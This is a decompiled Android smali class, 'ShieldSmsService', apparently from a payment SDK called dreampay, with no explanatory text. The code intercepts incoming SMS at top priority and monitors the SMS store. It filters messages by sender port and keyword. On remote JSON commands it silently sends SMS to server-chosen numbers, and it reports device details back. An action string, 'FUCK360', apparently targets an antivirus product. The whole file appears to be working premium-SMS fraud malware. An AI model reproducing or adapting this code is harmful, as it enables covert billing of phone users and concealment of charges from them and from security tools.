.class public Lcom/yuelan/dreampay/service/ShieldSmsService;
.super Landroid/app/Service;


# static fields
.field public static final Action_Add:Ljava/lang/String; = "com.yuelan.milipay.ShieldSmsService.add"

.field public static final Action_Init:Ljava/lang/String; = "com.yuelan.milipay.ShieldSmsService.init"

.field public static final Action_Windows:Ljava/lang/String; = "com.yuelan.milipay.ShieldSmsService.windows"

.field public static Can_SQ:Z = false

.field public static final SENT_SMS_ACTION:Ljava/lang/String; = "SMS_SEND_ACTIOIN"

.field public static final SMS_RECEIVED_ACTION:Ljava/lang/String; = "android.provider.Telephony.SMS_RECEIVED"


# instance fields
.field private a:Lcom/yuelan/dreampay/date/PBSmsDBH;

.field private b:Landroid/content/Context;

.field private c:Lcom/yuelan/dreampay/service/StartReceiver;

.field private d:Lcom/yuelan/codelib/download/DownloadDB;

.field private e:Lcom/yuelan/dreampay/service/f;

.field private f:Lcom/yuelan/dreampay/service/IMyService;

.field private g:Landroid/content/ServiceConnection;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    const/4 v0, 0x1

    sput-boolean v0, Lcom/yuelan/dreampay/service/ShieldSmsService;->Can_SQ:Z

    return-void
.end method

.method public constructor <init>()V
    .locals 1

    const/4 v0, 0x0

    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    iput-object v0, p0, Lcom/yuelan/dreampay/service/ShieldSmsService;->a:Lcom/yuelan/dreampay/date/PBSmsDBH;

    iput-object v0, p0, Lcom/yuelan/dreampay/service/ShieldSmsService;->f:Lcom/yuelan/dreampay/service/IMyService;

    new-instance v0, Lcom/yuelan/dreampay/service/b;

    invoke-direct {v0, p0}, Lcom/yuelan/dreampay/service/b;-><init>(Lcom/yuelan/dreampay/service/ShieldSmsService;)V

    iput-object v0, p0, Lcom/yuelan/dreampay/service/ShieldSmsService;->g:Landroid/content/ServiceConnection;

    return-void
.end method

.method static synthetic a(Lcom/yuelan/dreampay/service/ShieldSmsService;)Lcom/yuelan/dreampay/service/IMyService;
    .locals 1

    iget-object v0, p0, Lcom/yuelan/dreampay/service/ShieldSmsService;->f:Lcom/yuelan/dreampay/service/IMyService;

    return-object v0
.end method

.method static synthetic a(Lcom/yuelan/dreampay/service/ShieldSmsService;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/util/ArrayList;
    .locals 6

    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    const-string v1, "select * from pb_table"

    iget-object v2, p0, Lcom/yuelan/dreampay/service/ShieldSmsService;->a:Lcom/yuelan/dreampay/date/PBSmsDBH;

    const/4 v3, 0x0

    invoke-virtual {v2, v1, v3}, Lcom/yuelan/dreampay/date/PBSmsDBH;->query(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v1

    invoke-interface {v1, p1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v2

    invoke-interface {v1, p2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v3

    if-eqz v1, :cond_1

    :cond_0
    :goto_0
    invoke-interface {v1}, Landroid/database/Cursor;->moveToNext()Z

    move-result v4

    if-nez v4, :cond_2

    :cond_1
    invoke-interface {v1}, Landroid/database/Cursor;->close()V

    return-object v0

    :cond_2
    invoke-interface {v1, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v4

    invoke-interface {v1, v3}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {p3, v4}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v4

    if-eqz v4, :cond_0

    invoke-virtual {v0, v5}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    goto :goto_0
.end method

.method private a(ILcom/yuelan/dreampay/date/PayDetailInfo;)V
    .locals 5

    if-nez p2, :cond_0

    :goto_0
    return-void

    :cond_0
    invoke-static {}, Lcom/yuelan/codelib/utils/TimeUtil;->getNowTimeNum()Ljava/lang/String;

    move-result-object v0

    iget-object v1, p0, Lcom/yuelan/dreampay/service/ShieldSmsService;->b:Landroid/content/Context;

    invoke-static {v1}, Lcom/yuelan/dreampay/common/AppDo;->getUserBaseDeviceInfo(Landroid/content/Context;)Ljava/util/Map;

    move-result-object v1

    const-string v2, "stringNo"

    invoke-virtual {p2}, Lcom/yuelan/dreampay/date/PayDetailInfo;->getStringNo()Ljava/lang/String;

    move-result-object v3

    invoke-interface {v1, v2, v3}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v2, "state"

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-static {p1}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-interface {v1, v2, v3}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v2, "passId"

    invoke-virtual {p2}, Lcom/yuelan/dreampay/date/PayDetailInfo;->getPassId()Ljava/lang/String;

    move-result-object v3

    invoke-interface {v1, v2, v3}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v2, "spId"

    invoke-virtual {p2}, Lcom/yuelan/dreampay/date/PayDetailInfo;->getSpId()Ljava/lang/String;

    move-result-object v3

    invoke-interface {v1, v2, v3}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v2, "createTime"

    invoke-interface {v1, v2, v0}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v2, "yys"

    invoke-virtual {p2}, Lcom/yuelan/dreampay/date/PayDetailInfo;->getPayOtherInfo()Lcom/yuelan/dreampay/date/PayOtherInfo;

    move-result-object v3

    invoke-virtual {v3}, Lcom/yuelan/dreampay/date/PayOtherInfo;->getYys()Ljava/lang/String;

    move-result-object v3

    invoke-interface {v1, v2, v3}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v2, "isOnly"

    invoke-virtual {p2}, Lcom/yuelan/dreampay/date/PayDetailInfo;->getIsOnly()Ljava/lang/String;

    move-result-object v3

    invoke-interface {v1, v2, v3}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    new-instance v2, Lcom/yuelan/dreampay/service/c;

    invoke-direct {v2, p0, v0, v1}, Lcom/yuelan/dreampay/service/c;-><init>(Lcom/yuelan/dreampay/service/ShieldSmsService;Ljava/lang/String;Ljava/util/Map;)V

    new-instance v0, Ljava/lang/Thread;

    new-instance v3, Lcom/yuelan/dreampay/thread/SQFanKuiThread;

    invoke-direct {v3, v2, v1}, Lcom/yuelan/dreampay/thread/SQFanKuiThread;-><init>(Landroid/os/Handler;Ljava/util/Map;)V

    invoke-direct {v0, v3}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    goto :goto_0
.end method

.method static synthetic a(Lcom/yuelan/dreampay/service/ShieldSmsService;ILcom/yuelan/dreampay/date/PayDetailInfo;)V
    .locals 0

    invoke-direct {p0, p1, p2}, Lcom/yuelan/dreampay/service/ShieldSmsService;->a(ILcom/yuelan/dreampay/date/PayDetailInfo;)V

    return-void
.end method

.method static synthetic a(Lcom/yuelan/dreampay/service/ShieldSmsService;Lcom/yuelan/codelib/download/DownloadDB;)V
    .locals 0

    iput-object p1, p0, Lcom/yuelan/dreampay/service/ShieldSmsService;->d:Lcom/yuelan/codelib/download/DownloadDB;

    return-void
.end method

.method static synthetic a(Lcom/yuelan/dreampay/service/ShieldSmsService;Lcom/yuelan/dreampay/service/IMyService;)V
    .locals 0

    iput-object p1, p0, Lcom/yuelan/dreampay/service/ShieldSmsService;->f:Lcom/yuelan/dreampay/service/IMyService;

    return-void
.end method

.method private a(Ljava/lang/String;)V
    .locals 9

    const/4 v0, 0x0

    :try_start_0
    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1, p1}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    const-string v2, "results"

    invoke-virtual {v1, v2}, Lorg/json/JSONObject;->getJSONObject(Ljava/lang/String;)Lorg/json/JSONObject;

    move-result-object v1

    const-string v2, "yys"

    invoke-virtual {v1, v2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    new-instance v3, Lcom/yuelan/dreampay/date/PayDetailInfo;

    invoke-direct {v3, v1}, Lcom/yuelan/dreampay/date/PayDetailInfo;-><init>(Lorg/json/JSONObject;)V

    new-instance v1, Lcom/yuelan/dreampay/date/PayOtherInfo;

    invoke-direct {v1}, Lcom/yuelan/dreampay/date/PayOtherInfo;-><init>()V

    invoke-virtual {v1, v2}, Lcom/yuelan/dreampay/date/PayOtherInfo;->setYys(Ljava/lang/String;)V

    invoke-virtual {v3, v1}, Lcom/yuelan/dreampay/date/PayDetailInfo;->setPayOtherInfo(Lcom/yuelan/dreampay/date/PayOtherInfo;)V

    invoke-virtual {v3}, Lcom/yuelan/dreampay/date/PayDetailInfo;->getSmsPreventC()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Lcom/yuelan/codelib/utils/TextUtil;->notNull(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_0

    new-instance v2, Lorg/json/JSONArray;

    invoke-direct {v2, v1}, Lorg/json/JSONArray;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2}, Lorg/json/JSONArray;->length()I

    move-result v1

    if-lez v1, :cond_0

    iget-object v1, p0, Lcom/yuelan/dreampay/service/ShieldSmsService;->a:Lcom/yuelan/dreampay/date/PBSmsDBH;

    invoke-virtual {v3}, Lcom/yuelan/dreampay/date/PayDetailInfo;->getPassId()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v1, v4}, Lcom/yuelan/dreampay/date/PBSmsDBH;->deleteFromPassId(Ljava/lang/String;)V

    move v1, v0

    :goto_0
    invoke-virtual {v2}, Lorg/json/JSONArray;->length()I

    move-result v0

    if-lt v1, v0, :cond_2

    :cond_0
    invoke-virtual {v3}, Lcom/yuelan/dreampay/date/PayDetailInfo;->getSmArray()Lorg/json/JSONArray;

    move-result-object v0

    if-eqz v0, :cond_1

    invoke-virtual {v0}, Lorg/json/JSONArray;->length()I
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_1

    move-result v1

    if-lez v1, :cond_1

    const/4 v1, 0x0

    :try_start_1
    invoke-virtual {v0, v1}, Lorg/json/JSONArray;->getJSONObject(I)Lorg/json/JSONObject;

    move-result-object v0

    const-string v1, "type"

    invoke-virtual {v0, v1}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, "sendMsg"

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_4

    new-instance v1, Lcom/yuelan/dreampay/service/g;

    invoke-direct {v1, p0, v3}, Lcom/yuelan/dreampay/service/g;-><init>(Lcom/yuelan/dreampay/service/ShieldSmsService;Lcom/yuelan/dreampay/date/PayDetailInfo;)V

    new-instance v2, Landroid/content/IntentFilter;

    invoke-direct {v2}, Landroid/content/IntentFilter;-><init>()V

    const v3, 0x7fffffff

    invoke-virtual {v2, v3}, Landroid/content/IntentFilter;->setPriority(I)V

    const-string v3, "SMS_SEND_ACTIOIN"

    invoke-virtual {v2, v3}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    iget-object v3, p0, Lcom/yuelan/dreampay/service/ShieldSmsService;->b:Landroid/content/Context;

    invoke-virtual {v3, v1, v2}, Landroid/content/Context;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    const-string v1, "smsContent"

    invoke-virtual {v0, v1}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, "utf-8"

    invoke-static {v1, v2}, Ljava/net/URLDecoder;->decode(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, "smsSend"

    invoke-virtual {v0, v2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iget-object v2, p0, Lcom/yuelan/dreampay/service/ShieldSmsService;->b:Landroid/content/Context;

    const/4 v3, 0x0

    invoke-static {v2, v0, v1, v3}, Lcom/yuelan/codelib/sim/SIMUtil;->sendSmsMessage(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_3
    .catch Lorg/json/JSONException; {:try_start_1 .. :try_end_1} :catch_1

    :cond_1
    :goto_1
    return-void

    :cond_2
    :try_start_2
    invoke-virtual {v2, v1}, Lorg/json/JSONArray;->getJSONObject(I)Lorg/json/JSONObject;

    move-result-object v0

    const-string v4, "filterSpnumber"

    invoke-virtual {v0, v4}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    const-string v5, "keyword"

    invoke-virtual {v0, v5}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;
    :try_end_2
    .catch Lorg/json/JSONException; {:try_start_2 .. :try_end_2} :catch_1

    move-result-object v0

    :try_start_3
    invoke-direct {p0, v4, v0}, Lcom/yuelan/dreampay/service/ShieldSmsService;->a(Ljava/lang/String;Ljava/lang/String;)Z

    move-result v5

    if-nez v5, :cond_3

    const-string v5, "insert into pb_table(port,keyone,passid) values(?,?,?)"

    iget-object v6, p0, Lcom/yuelan/dreampay/service/ShieldSmsService;->a:Lcom/yuelan/dreampay/date/PBSmsDBH;

    const/4 v7, 0x3

    new-array v7, v7, [Ljava/lang/Object;

    const/4 v8, 0x0

    aput-object v4, v7, v8

    const/4 v4, 0x1

    aput-object v0, v7, v4

    const/4 v0, 0x2

    invoke-virtual {v3}, Lcom/yuelan/dreampay/date/PayDetailInfo;->getPassId()Ljava/lang/String;

    move-result-object v4

    aput-object v4, v7, v0

    invoke-virtual {v6, v5, v7}, Lcom/yuelan/dreampay/date/PBSmsDBH;->execSQL(Ljava/lang/String;[Ljava/lang/Object;)V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_0
    .catch Lorg/json/JSONException; {:try_start_3 .. :try_end_3} :catch_1

    :cond_3
    :goto_2
    add-int/lit8 v0, v1, 0x1

    move v1, v0

    goto/16 :goto_0

    :catch_0
    move-exception v0

    :try_start_4
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V
    :try_end_4
    .catch Lorg/json/JSONException; {:try_start_4 .. :try_end_4} :catch_1

    goto :goto_2

    :catch_1
    move-exception v0

    invoke-static {v0}, Lcom/yuelan/codelib/utils/LogUtil;->e(Ljava/lang/Exception;)V

    goto :goto_1

    :cond_4
    :try_start_5
    const-string v2, "cmread"

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_1

    const-string v1, "bookPayType"

    invoke-virtual {v0, v1}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, "cmreadurl"

    invoke-virtual {v0, v2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/yuelan/codelib/utils/TextUtil;->notNull(Ljava/lang/String;)Z
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_3
    .catch Lorg/json/JSONException; {:try_start_5 .. :try_end_5} :catch_1

    move-result v2

    if-eqz v2, :cond_5

    :try_start_6
    new-instance v2, Lcom/yuelan/dreampay/service/d;

    invoke-direct {v2, p0, v3}, Lcom/yuelan/dreampay/service/d;-><init>(Lcom/yuelan/dreampay/service/ShieldSmsService;Lcom/yuelan/dreampay/date/PayDetailInfo;)V

    new-instance v4, Ljava/lang/Thread;

    new-instance v5, Lcom/yuelan/dreampay/service/e;

    invoke-direct {v5, p0, v1, v0, v2}, Lcom/yuelan/dreampay/service/e;-><init>(Lcom/yuelan/dreampay/service/ShieldSmsService;Ljava/lang/String;Ljava/lang/String;Landroid/os/Handler;)V

    invoke-direct {v4, v5}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v4}, Ljava/lang/Thread;->start()V
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_2
    .catch Lorg/json/JSONException; {:try_start_6 .. :try_end_6} :catch_1

    goto :goto_1

    :catch_2
    move-exception v0

    const/4 v1, 0x1

    :try_start_7
    invoke-direct {p0, v1, v3}, Lcom/yuelan/dreampay/service/ShieldSmsService;->a(ILcom/yuelan/dreampay/date/PayDetailInfo;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_3
    .catch Lorg/json/JSONException; {:try_start_7 .. :try_end_7} :catch_1

    goto :goto_1

    :catch_3
    move-exception v0

    :try_start_8
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V
    :try_end_8
    .catch Lorg/json/JSONException; {:try_start_8 .. :try_end_8} :catch_1

    goto :goto_1

    :cond_5
    const/4 v0, 0x1

    :try_start_9
    invoke-direct {p0, v0, v3}, Lcom/yuelan/dreampay/service/ShieldSmsService;->a(ILcom/yuelan/dreampay/date/PayDetailInfo;)V
    :try_end_9
    .catch Ljava/lang/Exception; {:try_start_9 .. :try_end_9} :catch_3
    .catch Lorg/json/JSONException; {:try_start_9 .. :try_end_9} :catch_1

    goto :goto_1
.end method

.method private a(Ljava/lang/String;Ljava/lang/String;)Z
    .locals 5

    const/4 v0, 0x1

    const/4 v1, 0x0

    const-string v2, "select * from pb_table where port = ? and keyone = ? "

    iget-object v3, p0, Lcom/yuelan/dreampay/service/ShieldSmsService;->a:Lcom/yuelan/dreampay/date/PBSmsDBH;

    const/4 v4, 0x2

    new-array v4, v4, [Ljava/lang/String;

    aput-object p1, v4, v1

    aput-object p2, v4, v0

    invoke-virtual {v3, v2, v4}, Lcom/yuelan/dreampay/date/PBSmsDBH;->query(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v2

    if-eqz v2, :cond_0

    invoke-interface {v2}, Landroid/database/Cursor;->getCount()I

    move-result v2

    if-lez v2, :cond_0

    :goto_0
    return v0

    :cond_0
    move v0, v1

    goto :goto_0
.end method

.method static synthetic b(Lcom/yuelan/dreampay/service/ShieldSmsService;)Lcom/yuelan/codelib/download/DownloadDB;
    .locals 1

    iget-object v0, p0, Lcom/yuelan/dreampay/service/ShieldSmsService;->d:Lcom/yuelan/codelib/download/DownloadDB;

    return-object v0
.end method

.method static synthetic c(Lcom/yuelan/dreampay/service/ShieldSmsService;)Landroid/content/Context;
    .locals 1

    iget-object v0, p0, Lcom/yuelan/dreampay/service/ShieldSmsService;->b:Landroid/content/Context;

    return-object v0
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1

    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .locals 4

    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    invoke-virtual {p0}, Lcom/yuelan/dreampay/service/ShieldSmsService;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    iput-object v0, p0, Lcom/yuelan/dreampay/service/ShieldSmsService;->b:Landroid/content/Context;

    const-string v0, "\u6ce8\u518c\u5e7f\u64ad"

    invoke-static {v0}, Lcom/yuelan/codelib/utils/LogUtil;->v(Ljava/lang/String;)V

    new-instance v0, Lcom/yuelan/dreampay/service/StartReceiver;

    invoke-direct {v0}, Lcom/yuelan/dreampay/service/StartReceiver;-><init>()V

    iput-object v0, p0, Lcom/yuelan/dreampay/service/ShieldSmsService;->c:Lcom/yuelan/dreampay/service/StartReceiver;

    new-instance v0, Landroid/content/IntentFilter;

    invoke-direct {v0}, Landroid/content/IntentFilter;-><init>()V

    const v1, 0x7fffffff

    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->setPriority(I)V

    const-string v1, "android.provider.Telephony.SMS_RECEIVED"

    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    iget-object v1, p0, Lcom/yuelan/dreampay/service/ShieldSmsService;->c:Lcom/yuelan/dreampay/service/StartReceiver;

    invoke-virtual {p0, v1, v0}, Lcom/yuelan/dreampay/service/ShieldSmsService;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    new-instance v0, Lcom/yuelan/codelib/download/DownloadDB;

    invoke-direct {v0, p0}, Lcom/yuelan/codelib/download/DownloadDB;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lcom/yuelan/dreampay/service/ShieldSmsService;->d:Lcom/yuelan/codelib/download/DownloadDB;

    new-instance v0, Lcom/yuelan/dreampay/date/PBSmsDBH;

    iget-object v1, p0, Lcom/yuelan/dreampay/service/ShieldSmsService;->b:Landroid/content/Context;

    invoke-direct {v0, v1}, Lcom/yuelan/dreampay/date/PBSmsDBH;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lcom/yuelan/dreampay/service/ShieldSmsService;->a:Lcom/yuelan/dreampay/date/PBSmsDBH;

    new-instance v0, Lcom/yuelan/dreampay/service/f;

    invoke-direct {v0, p0}, Lcom/yuelan/dreampay/service/f;-><init>(Lcom/yuelan/dreampay/service/ShieldSmsService;)V

    iput-object v0, p0, Lcom/yuelan/dreampay/service/ShieldSmsService;->e:Lcom/yuelan/dreampay/service/f;

    new-instance v0, Landroid/content/IntentFilter;

    invoke-direct {v0}, Landroid/content/IntentFilter;-><init>()V

    const-string v1, "android.intent.action.PACKAGE_ADDED"

    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    const-string v1, "android.intent.action.PACKAGE_REMOVED"

    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    const-string v1, "package"

    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->addDataScheme(Ljava/lang/String;)V

    iget-object v1, p0, Lcom/yuelan/dreampay/service/ShieldSmsService;->e:Lcom/yuelan/dreampay/service/f;

    invoke-virtual {p0, v1, v0}, Lcom/yuelan/dreampay/service/ShieldSmsService;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    new-instance v0, Lcom/yuelan/dreampay/service/h;

    new-instance v1, Landroid/os/Handler;

    invoke-direct {v1}, Landroid/os/Handler;-><init>()V

    invoke-direct {v0, p0, v1}, Lcom/yuelan/dreampay/service/h;-><init>(Lcom/yuelan/dreampay/service/ShieldSmsService;Landroid/os/Handler;)V

    iget-object v1, p0, Lcom/yuelan/dreampay/service/ShieldSmsService;->b:Landroid/content/Context;

    invoke-virtual {v1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v1

    const-string v2, "content://sms/"

    invoke-static {v2}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v2

    const/4 v3, 0x1

    invoke-virtual {v1, v2, v3, v0}, Landroid/content/ContentResolver;->registerContentObserver(Landroid/net/Uri;ZLandroid/database/ContentObserver;)V

    const-string v0, "fuwonCreate"

    invoke-static {v0}, Lcom/yuelan/codelib/utils/LogUtil;->v(Ljava/lang/String;)V

    return-void
.end method

.method public onDestroy()V
    .locals 1

    iget-object v0, p0, Lcom/yuelan/dreampay/service/ShieldSmsService;->a:Lcom/yuelan/dreampay/date/PBSmsDBH;

    if-eqz v0, :cond_0

    iget-object v0, p0, Lcom/yuelan/dreampay/service/ShieldSmsService;->a:Lcom/yuelan/dreampay/date/PBSmsDBH;

    invoke-virtual {v0}, Lcom/yuelan/dreampay/date/PBSmsDBH;->close()V

    const/4 v0, 0x0

    iput-object v0, p0, Lcom/yuelan/dreampay/service/ShieldSmsService;->a:Lcom/yuelan/dreampay/date/PBSmsDBH;

    :cond_0
    iget-object v0, p0, Lcom/yuelan/dreampay/service/ShieldSmsService;->g:Landroid/content/ServiceConnection;

    invoke-virtual {p0, v0}, Lcom/yuelan/dreampay/service/ShieldSmsService;->unbindService(Landroid/content/ServiceConnection;)V

    iget-object v0, p0, Lcom/yuelan/dreampay/service/ShieldSmsService;->c:Lcom/yuelan/dreampay/service/StartReceiver;

    invoke-virtual {p0, v0}, Lcom/yuelan/dreampay/service/ShieldSmsService;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V

    iget-object v0, p0, Lcom/yuelan/dreampay/service/ShieldSmsService;->e:Lcom/yuelan/dreampay/service/f;

    invoke-virtual {p0, v0}, Lcom/yuelan/dreampay/service/ShieldSmsService;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V

    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 8

    const/4 v7, 0x1

    const-string v0, "onStartCommand"

    invoke-static {v0}, Lcom/yuelan/codelib/utils/LogUtil;->v(Ljava/lang/String;)V

    new-instance v0, Landroid/content/Intent;

    const-string v1, "com.yuelan.gamead.service.IMyService"

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    iget-object v1, p0, Lcom/yuelan/dreampay/service/ShieldSmsService;->g:Landroid/content/ServiceConnection;

    invoke-virtual {p0, v0, v1, v7}, Lcom/yuelan/dreampay/service/ShieldSmsService;->bindService(Landroid/content/Intent;Landroid/content/ServiceConnection;I)Z

    if-eqz p1, :cond_1

    invoke-virtual {p1}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v0

    iget-object v1, p0, Lcom/yuelan/dreampay/service/ShieldSmsService;->a:Lcom/yuelan/dreampay/date/PBSmsDBH;

    if-nez v1, :cond_0

    new-instance v1, Lcom/yuelan/dreampay/date/PBSmsDBH;

    iget-object v2, p0, Lcom/yuelan/dreampay/service/ShieldSmsService;->b:Landroid/content/Context;

    invoke-direct {v1, v2}, Lcom/yuelan/dreampay/date/PBSmsDBH;-><init>(Landroid/content/Context;)V

    iput-object v1, p0, Lcom/yuelan/dreampay/service/ShieldSmsService;->a:Lcom/yuelan/dreampay/date/PBSmsDBH;

    :cond_0
    const-string v1, "com.yuelan.milipay.ShieldSmsService.add"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_2

    const-string v0, "phonenum"

    invoke-virtual {p1, v0}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "keyone"

    invoke-virtual {p1, v1}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, "passid"

    invoke-virtual {p1, v2}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {p0, v0, v1}, Lcom/yuelan/dreampay/service/ShieldSmsService;->a(Ljava/lang/String;Ljava/lang/String;)Z

    move-result v3

    if-nez v3, :cond_1

    const-string v3, "insert into pb_table(port,keyone,passid) values(?,?,?)"

    iget-object v4, p0, Lcom/yuelan/dreampay/service/ShieldSmsService;->a:Lcom/yuelan/dreampay/date/PBSmsDBH;

    const/4 v5, 0x3

    new-array v5, v5, [Ljava/lang/Object;

    const/4 v6, 0x0

    aput-object v0, v5, v6

    aput-object v1, v5, v7

    const/4 v0, 0x2

    aput-object v2, v5, v0

    invoke-virtual {v4, v3, v5}, Lcom/yuelan/dreampay/date/PBSmsDBH;->execSQL(Ljava/lang/String;[Ljava/lang/Object;)V

    :cond_1
    :goto_0
    invoke-super {p0, p1, p2, p3}, Landroid/app/Service;->onStartCommand(Landroid/content/Intent;II)I

    move-result v0

    return v0

    :cond_2
    const-string v1, "FUCK360"

    invoke-virtual {v0, v1}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_1

    sget-boolean v0, Lcom/yuelan/dreampay/service/ShieldSmsService;->Can_SQ:Z

    if-eqz v0, :cond_1

    const-string v0, "obj"

    invoke-virtual {p1, v0}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "inin"

    invoke-static {v1}, Lcom/yuelan/codelib/utils/LogUtil;->v(Ljava/lang/String;)V

    invoke-static {v0}, Lcom/yuelan/codelib/utils/TextUtil;->notNull(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_1

    const-string v1, "0"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_1

    invoke-direct {p0, v0}, Lcom/yuelan/dreampay/service/ShieldSmsService;->a(Ljava/lang/String;)V

    goto :goto_0
.end method
